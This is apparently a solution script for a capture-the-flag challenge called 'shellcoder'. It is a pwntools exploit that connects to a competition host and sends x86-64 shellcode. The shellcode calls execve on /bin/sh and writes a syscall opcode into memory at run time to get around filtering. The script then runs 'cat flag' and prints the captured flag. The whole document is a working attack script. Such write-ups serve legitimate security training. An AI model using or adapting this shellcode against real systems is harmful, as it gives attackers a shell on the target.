#!/usr/bin/env python3

import logging
import os
from pwn import *

logging.disable()

filename = os.path.join(os.path.dirname(__file__), "shellcoder")
exe = context.binary = ELF(args.EXE or filename, checksec=False)
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

logging.disable()

HOST = os.environ.get("HOST", "shellcoder.challs.external.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38201))

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote(HOST, PORT)

gdbscript = '''
c
'''.format(**locals())

# ==========================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

shellcode = f"""
    mov rax, 0x3b;
    xor rsi, rsi;
    xor rdx, rdx;
    mov rdi, 0xbeef0100;
    mov r10, 0xbeef0032;
    mov r11, 0x0500;
    add r11, 0x0f;
    mov qword ptr [r10], r11;
"""
shellcode = asm(shellcode)
shellcode += b"\x90" * (0x100 - len(shellcode)) + b"/bin/sh\x00"


io = start()
io.sendlineafter(b"How many bytes?", str(len(shellcode)).encode())
io.sendlineafter(b"Shellcode:", shellcode)

if args.GDB:
    io.interactive()
else:
    io.sendline(b"cat flag")
    time.sleep(1)
    res = io.recvuntil(b"CCIT{").strip()
    print('CCIT{' + io.recvuntil(b'}').strip().decode())
